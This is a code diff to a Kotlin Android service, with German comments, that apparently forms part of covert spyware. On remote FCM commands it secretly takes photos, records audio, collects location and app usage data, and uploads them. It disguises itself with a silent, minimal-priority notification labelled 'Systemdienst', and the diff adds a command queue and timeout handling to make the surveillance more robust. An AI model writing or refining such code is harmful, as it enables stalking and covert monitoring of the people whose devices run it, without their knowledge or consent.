@@ -16,29 +16,34 @@ import com.ikianti.app.capture.AudioCapture
 import com.ikianti.app.capture.CameraCapture
 import com.ikianti.app.capture.LocationCapture
 import com.ikianti.app.capture.UsageStatsCapture
+import java.util.ArrayDeque
+import java.util.UUID
 
 /**
  * Persistenter Foreground Service.
  *
- * Wird beim App-Start aus dem Vordergrund gestartet (wichtig für Android 12+
- * Kamera/Mikro-Zugriff). Läuft dauerhaft im Hintergrund.
- *
- * Empfängt Befehle über:
- * 1. Lokalen Broadcast (wenn Service läuft)
- * 2. Gespeicherten Befehl in SharedPreferences (wenn Service neu gestartet wird)
+ * Verantwortlich für:
+ * - Empfang von Remote-Befehlen
+ * - Übernahme der persistenten FCM-Warteschlange
+ * - sequenzielle Verarbeitung der Befehle
+ * - Timeout-Überwachung
+ * - Schutz vor verspäteten Callbacks
  */
 class CaptureForegroundService : Service() {
 
     companion object {
         const val ACTION_COMMAND = "com.ikianti.app.ACTION_COMMAND"
-        const val EXTRA_COMMAND  = "command"
-        private const val CHANNEL_ID      = "sys_service_channel"
+        const val EXTRA_COMMAND = "command"
+
+        private const val CHANNEL_ID = "sys_service_channel"
         private const val NOTIFICATION_ID = 1
-        private const val TIMEOUT_MS      = 30_000L
-        private const val TAG             = "CaptureFGS"
+        private const val TIMEOUT_MS = 30_000L
+        private const val TAG = "CaptureFGS"
 
         fun start(context: Context) {
-            val intent = Intent(context, CaptureForegroundService::class.java)
+            val intent =
+                Intent(context, CaptureForegroundService::class.java)
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
@@ -46,120 +51,471 @@ class CaptureForegroundService : Service() {
             }
         }
 
+        /**
+         * Signalisiert dem Foreground Service,
+         * dass neue persistente Befehle vorhanden sind.
+         *
+         * Der eigentliche Befehl wird nicht direkt verarbeitet.
+         * Dadurch bleibt SharedPreferences die zentrale Quelle
+         * für noch nicht übernommene FCM-Befehle.
+         */
         fun sendCommand(context: Context, command: String) {
+
             val intent = Intent(ACTION_COMMAND).apply {
                 putExtra(EXTRA_COMMAND, command)
                 setPackage(context.packageName)
             }
+
             context.sendBroadcast(intent)
         }
     }
 
-    private val mainHandler = Handler(Looper.getMainLooper())
-    private var isBusy = false
+    private val mainHandler =
+        Handler(Looper.getMainLooper())
 
-    private val commandReceiver = object : BroadcastReceiver() {
-        override fun onReceive(context: Context, intent: Intent) {
-            if (intent.action != ACTION_COMMAND) return
-            val command = intent.getStringExtra(EXTRA_COMMAND) ?: return
-            Log.d(TAG, "Broadcast-Befehl: $command")
-            // Gespeicherten Befehl löschen da wir ihn jetzt verarbeiten
-            FcmTriggerService.clearPendingCommand(context)
-            runCommand(command)
+    /**
+     * Interne FIFO-Warteschlange.
+     *
+     * Hier liegen Befehle, die bereits aus der persistenten
+     * Warteschlange übernommen wurden.
+     */
+    private val commandQueue =
+        ArrayDeque<String>()
+
+    /**
+     * Aktuell laufender Befehl.
+     */
+    private var activeCommand: String? = null
+
+    /**
+     * Eindeutige ID des aktuell laufenden Befehls.
+     */
+    private var activeCommandId: String? = null
+
+    /**
+     * Timeout des aktuell laufenden Befehls.
+     */
+    private var timeoutRunnable: Runnable? = null
+
+    private val commandReceiver =
+        object : BroadcastReceiver() {
+
+            override fun onReceive(
+                context: Context,
+                intent: Intent
+            ) {
+                if (intent.action != ACTION_COMMAND) {
+                    return
+                }
+
+                val command =
+                    intent.getStringExtra(EXTRA_COMMAND)
+
+                Log.d(
+                    TAG,
+                    "Broadcast-Signal empfangen" +
+                        if (command != null) {
+                            ": $command"
+                        } else {
+                            ""
+                        }
+                )
+
+                /*
+                 * Nicht nur den Broadcast-Befehl übernehmen.
+                 *
+                 * Stattdessen wird die komplette persistente
+                 * Warteschlange atomar übernommen.
+                 */
+                loadPendingCommands()
+            }
         }
-    }
 
     override fun onCreate() {
         super.onCreate()
+
         startForegroundCompat()
 
-        val filter = IntentFilter(ACTION_COMMAND)
+        val filter =
+            IntentFilter(ACTION_COMMAND)
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
+
+            registerReceiver(
+                commandReceiver,
+                filter,
+                RECEIVER_NOT_EXPORTED
+            )
+
         } else {
-            registerReceiver(commandReceiver, filter)
+
+            registerReceiver(
+                commandReceiver,
+                filter
+            )
         }
 
-        // Gespeicherten Befehl aus SharedPreferences ausführen (Fallback)
-        val pendingCommand = FcmTriggerService.getPendingCommand(this)
-        if (pendingCommand != null) {
-            Log.d(TAG, "Gespeicherter Befehl gefunden: $pendingCommand")
-            FcmTriggerService.clearPendingCommand(this)
-            mainHandler.postDelayed({ runCommand(pendingCommand) }, 1000)
-        }
+        /*
+         * Falls FCM-Befehle eingetroffen sind, während der
+         * Foreground Service nicht lief, werden sie jetzt
+         * aus der persistenten Queue übernommen.
+         */
+        loadPendingCommands()
 
-        Log.d(TAG, "Persistenter Service gestartet")
+        Log.d(
+            TAG,
+            "Persistenter Service gestartet"
+        )
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+    override fun onStartCommand(
+        intent: Intent?,
+        flags: Int,
+        startId: Int
+    ): Int {
+
+        /*
+         * Auch bei einem erneuten Start prüfen wir,
+         * ob noch persistente Befehle vorhanden sind.
+         */
+        loadPendingCommands()
+
         return START_STICKY
     }
 
-    private fun runCommand(command: String) {
-        if (isBusy) {
-            Log.w(TAG, "Service beschäftigt – Befehl ignoriert: $command")
+    /**
+     * Übernimmt alle aktuell persistent gespeicherten Befehle.
+     *
+     * Die Methode ist bewusst atomar:
+     * Lesen + Löschen der persistenten Queue erfolgt
+     * innerhalb eines synchronisierten Aufrufs.
+     */
+    private fun loadPendingCommands() {
+
+        val pendingCommands =
+            FcmTriggerService.takePendingCommands(this)
+
+        if (pendingCommands.isEmpty()) {
             return
         }
-        isBusy = true
-        Log.d(TAG, "Führe aus: $command")
 
-        val timeoutRunnable = Runnable {
-            Log.w(TAG, "Timeout: $command")
-            isBusy = false
+        Log.d(
+            TAG,
+            "Übernehme ${pendingCommands.size} " +
+                "persistente(n) Befehl(e)"
+        )
+
+        for (command in pendingCommands) {
+
+            if (!isValidCommand(command)) {
+
+                Log.w(
+                    TAG,
+                    "Ungültiger persistenter Befehl verworfen: $command"
+                )
+
+                continue
+            }
+
+            commandQueue.addLast(command)
+
+            Log.d(
+                TAG,
+                "Befehl aus persistentem Speicher übernommen: " +
+                    "$command | " +
+                    "Warteschlange=${commandQueue.size}"
+            )
         }
-        mainHandler.postDelayed(timeoutRunnable, TIMEOUT_MS)
+
+        processNextCommand()
+    }
+
+    /**
+     * Fügt einen bereits übernommenen Befehl
+     * der internen FIFO-Warteschlange hinzu.
+     */
+    private fun enqueueCommand(command: String) {
+
+        if (!isValidCommand(command)) {
+
+            Log.w(
+                TAG,
+                "Unbekannter Befehl verworfen: $command"
+            )
+
+            return
+        }
+
+        commandQueue.addLast(command)
+
+        Log.d(
+            TAG,
+            "Befehl eingereiht: $command | " +
+                "Warteschlange=${commandQueue.size}"
+        )
+
+        processNextCommand()
+    }
+
+    /**
+     * Startet den nächsten Befehl,
+     * sofern momentan keiner läuft.
+     */
+    private fun processNextCommand() {
+
+        if (activeCommand != null) {
+            return
+        }
+
+        if (commandQueue.isEmpty()) {
+            return
+        }
+
+        val command =
+            commandQueue.removeFirst()
+
+        val commandId =
+            UUID.randomUUID().toString()
+
+        activeCommand = command
+        activeCommandId = commandId
+
+        Log.d(
+            TAG,
+            "Führe aus: $command | id=$commandId"
+        )
+
+        val timeout =
+            Runnable {
+                handleTimeout(
+                    command = command,
+                    commandId = commandId
+                )
+            }
+
+        timeoutRunnable = timeout
+
+        mainHandler.postDelayed(
+            timeout,
+            TIMEOUT_MS
+        )
 
         val onDone = {
-            mainHandler.removeCallbacks(timeoutRunnable)
-            isBusy = false
-            Log.d(TAG, "Abgeschlossen: $command")
+            finishCommand(
+                command = command,
+                commandId = commandId
+            )
         }
 
-        when (command) {
-            "photo"    -> CameraCapture(this).captureAndUpload { onDone() }
-            "audio"    -> AudioCapture(this).recordAndUpload(seconds = 10) { onDone() }
-            "location" -> LocationCapture(this).fetchAndUpload { onDone() }
-            "usage"    -> UsageStatsCapture(this).collectAndUpload { onDone() }
-            else       -> { Log.w(TAG, "Unbekannt: $command"); isBusy = false }
+        try {
+
+            when (command) {
+
+                "photo" -> {
+                    CameraCapture(this)
+                        .captureAndUpload {
+                            onDone()
+                        }
+                }
+
+                "audio" -> {
+                    AudioCapture(this)
+                        .recordAndUpload(seconds = 10) {
+                            onDone()
+                        }
+                }
+
+                "location" -> {
+                    LocationCapture(this)
+                        .fetchAndUpload {
+                            onDone()
+                        }
+                }
+
+                "usage" -> {
+                    UsageStatsCapture(this)
+                        .collectAndUpload {
+                            onDone()
+                        }
+                }
+            }
+
+        } catch (e: Exception) {
+
+            Log.e(
+                TAG,
+                "Fehler beim Starten des Befehls: $command",
+                e
+            )
+
+            finishCommand(
+                command = command,
+                commandId = commandId
+            )
         }
     }
 
-    private fun startForegroundCompat() {
-        val channel = NotificationChannel(
-            CHANNEL_ID, "Systemdienste", NotificationManager.IMPORTANCE_MIN
-        ).apply {
-            setShowBadge(false)
-            enableLights(false)
-            enableVibration(false)
-        }
-        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
-            .createNotificationChannel(channel)
+    /**
+     * Erfolgreicher Abschluss eines Befehls.
+     */
+    private fun finishCommand(
+        command: String,
+        commandId: String
+    ) {
 
-        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
-            .setContentTitle("Systemdienst")
-            .setContentText("Systemprozess")
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setOngoing(true)
-            .setSilent(true)
-            .build()
+        if (activeCommandId != commandId) {
+
+            Log.w(
+                TAG,
+                "Verspäteter Callback ignoriert: " +
+                    "$command | id=$commandId"
+            )
+
+            return
+        }
+
+        timeoutRunnable?.let {
+            mainHandler.removeCallbacks(it)
+        }
+
+        timeoutRunnable = null
+
+        activeCommand = null
+        activeCommandId = null
+
+        Log.d(
+            TAG,
+            "Abgeschlossen: $command | id=$commandId"
+        )
+
+        processNextCommand()
+    }
+
+    /**
+     * Timeout eines laufenden Befehls.
+     */
+    private fun handleTimeout(
+        command: String,
+        commandId: String
+    ) {
+
+        if (activeCommandId != commandId) {
+            return
+        }
+
+        Log.w(
+            TAG,
+            "Timeout: $command | id=$commandId"
+        )
+
+        timeoutRunnable = null
+
+        activeCommand = null
+        activeCommandId = null
+
+        Log.w(
+            TAG,
+            "Befehl wegen Timeout beendet: $command"
+        )
+
+        processNextCommand()
+    }
+
+    /**
+     * Erlaubte Remote-Befehle.
+     */
+    private fun isValidCommand(
+        command: String
+    ): Boolean {
+
+        return command == "photo" ||
+            command == "audio" ||
+            command == "location" ||
+            command == "usage"
+    }
+
+    private fun startForegroundCompat() {
+
+        val channel =
+            NotificationChannel(
+                CHANNEL_ID,
+                "Systemdienste",
+                NotificationManager.IMPORTANCE_MIN
+            ).apply {
+
+                setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+            }
+
+        (
+            getSystemService(
+                NOTIFICATION_SERVICE
+            ) as NotificationManager
+        ).createNotificationChannel(channel)
+
+        val notification =
+            NotificationCompat.Builder(
+                this,
+                CHANNEL_ID
+            )
+                .setSmallIcon(
+                    android.R.drawable.stat_notify_sync_noanim
+                )
+                .setContentTitle(
+                    "Systemdienst"
+                )
+                .setContentText(
+                    "Systemprozess"
+                )
+                .setPriority(
+                    NotificationCompat.PRIORITY_MIN
+                )
+                .setOngoing(true)
+                .setSilent(true)
+                .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+
             startForeground(
-                NOTIFICATION_ID, notification,
+                NOTIFICATION_ID,
+                notification,
                 ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
             )
+
         } else {
-            startForeground(NOTIFICATION_ID, notification)
+
+            startForeground(
+                NOTIFICATION_ID,
+                notification
+            )
         }
     }
 
     override fun onDestroy() {
-        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
+
+        timeoutRunnable?.let {
+            mainHandler.removeCallbacks(it)
+        }
+
+        timeoutRunnable = null
+
+        activeCommand = null
+        activeCommandId = null
+
+        commandQueue.clear()
+
+        try {
+            unregisterReceiver(commandReceiver)
+        } catch (_: Exception) {
+        }
+
         super.onDestroy()
     }
 
-    override fun onBind(intent: Intent?): IBinder? = null
+    override fun onBind(
+        intent: Intent?
+    ): IBinder? = null
 }
